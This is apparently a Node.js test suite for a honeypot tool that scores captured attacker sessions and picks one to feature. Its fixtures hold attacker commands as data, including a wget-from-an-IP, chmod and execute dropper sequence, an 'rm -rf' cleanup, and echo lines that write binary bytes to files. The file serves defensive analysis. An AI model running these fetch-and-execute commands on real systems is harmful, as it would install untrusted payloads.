const { test, describe } = require('node:test');
const assert = require('node:assert/strict');
const { scoreSession, pickFeatured, verbsOf } = require('../lib/featured');

const STORY = [
  'uname -a',
  'cat /proc/cpuinfo',
  'cd /tmp; wget http://1.2.3.4/bins.sh',
  'chmod +x bins.sh; ./bins.sh',
  'rm -rf bins.sh',
];

// The shape that was being featured: a scripted dropper, long and repetitive,
// with binaries pushed through echo.
const DROPPER = [
  ...Array.from({ length: 40 }, (_, i) => `echo -ne "\\x7f\\x45" >> .s${i}`),
  ...Array.from({ length: 8 }, (_, i) => `echo ${'A'.repeat(2000 + i * 100)} > .b${i}`),
];

// What the first version actually featured in production: a honeypot
// fingerprinting script, forty printf variations of one check.
const PROBE = Array.from({ length: 40 }, (_, i) =>
  i % 2
    ? `printf '\\n%s|%s\\n' 'check_53245978362c_${i}' "$((348*112+${i}))"`
    : `sh -c 'printf '"'"'\\n%s\\n'"'"' '"'"'check_53245978362c_${i}'"'"''`
);

describe('scoreSession', () => {
  test('a session with fewer than three readable commands has no story', () => {
    assert.equal(scoreSession(['uname -a', 'whoami']), null);
    assert.equal(scoreSession([]), null);
  });

  test('duplicates do not count twice', () => {
    assert.equal(scoreSession(['ls', 'ls', 'ls', 'ls']), null);
  });

  test('ignores empty and non-string entries', () => {
    assert.equal(scoreSession(['', null, '  ', 'ls']), null);
  });

  test('a download outscores the same session without one', () => {
    const without = STORY.filter((c) => !c.includes('wget'));
    assert.ok(scoreSession(STORY) > scoreSession([...without, 'id']));
  });
});

describe('pickFeatured', () => {
  test('prefers a short story over a long blob-heavy dropper', () => {
    const picked = pickFeatured([
      { session_id: 'dropper', commands: DROPPER },
      { session_id: 'story', commands: STORY },
    ]);
    assert.equal(picked, 'story');
  });

  test('caps the credit for sheer length', () => {
    const script = Array.from({ length: 120 }, (_, i) => `echo line ${i}`);
    assert.equal(scoreSession(script), scoreSession(script.slice(0, 12)));
  });

  test('a small real attack beats a long single-purpose probe', () => {
    const small = ['uname -a', 'id', 'cd /tmp; wget http://x.example/a; chmod +x a'];
    assert.ok(scoreSession(small) > scoreSession(PROBE));
  });

  test('returns null when nothing qualifies', () => {
    assert.equal(pickFeatured([{ session_id: 'x', commands: ['ls'] }]), null);
    assert.equal(pickFeatured([]), null);
  });
});

describe('verbsOf', () => {
  test('ignores names that are not program-shaped', () => {
    const verbs = verbsOf('f_check_53245978362c15f8305192c19ff5de39() { printf x; }');
    assert.ok(!verbs.some((v) => v.startsWith('f_check')), JSON.stringify(verbs));
  });

  test('finds each program a command runs, without wrappers or paths', () => {
    assert.deepEqual(verbsOf('cd /tmp; wget http://x.example/a && chmod +x a; ./a'), ['cd', 'wget', 'chmod', 'a']);
    assert.deepEqual(verbsOf('sudo /bin/busybox cat /proc/cpuinfo | grep name'), ['cat', 'grep']);
    assert.deepEqual(verbsOf("sh -c 'uname -a'"), ['uname']);
  });
});

describe('a probe script against a real attack', () => {
  test('forty printf checks lose to a short attack with a download', () => {
    assert.equal(
      pickFeatured([
        { session_id: 'probe', commands: PROBE },
        { session_id: 'story', commands: STORY },
      ]),
      'story'
    );
  });

  test('the probe still qualifies when nothing better exists', () => {
    assert.equal(pickFeatured([{ session_id: 'probe', commands: PROBE }]), 'probe');
  });
});
